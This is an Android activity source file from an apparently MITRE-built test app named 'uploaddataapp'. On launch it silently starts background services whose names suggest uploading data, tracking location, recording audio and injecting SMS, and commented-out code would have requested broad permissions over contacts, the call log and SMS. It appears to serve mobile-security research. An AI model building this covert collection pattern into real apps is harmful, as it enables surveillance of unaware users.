/*
 * Copyright 2017 The MITRE Corporation
 * Approved for Public Release; Distribution Unlimited. Case Number 17-0137.
 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.

 * NOTICE
 * This software was produced for the U.S. Government under Basic Contract
 * No. W15P7T-13-C-A802, and is subject to the Rights in Noncommercial
 * Computer Software and Noncommercial Computer Software Documentation
 * Clause 252.227-7014 (FEB 2012)
 */

package com.example.uploaddataapp;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.Menu;
import android.view.MenuItem;

public class MainActivity extends AppCompatActivity /*implements EasyPermissions.PermissionCallbacks*/ {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        /*String perms[] = {
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_SMS,

        };
        EasyPermissions.requestPermissions(this, "blah", 123, perms);*/
        Intent i = new Intent(this, SendIntentService.class);
        startService(i);
        startService(new Intent(this, LocationService.class));
        startService(new Intent(this, RecordIntentService.class));
        startService(new Intent(this, InjectSMSService.class));
        /*Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });*/
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
/*
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        // Forward results to EasyPermissions
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
    }

    @Override
    public void onPermissionsGranted(List<String> list) {
        // Some permissions have been granted
        // The individual services check which permissions are granted before each action
        startService(new Intent(this, SendIntentService.class));
        startService(new Intent(this, LocationService.class));
        startService(new Intent(this, RecordIntentService.class));
    }

    @Override
    public void onPermissionsDenied(List<String> list) {
        // Some permissions have been denied
        // ...
    }*/
}
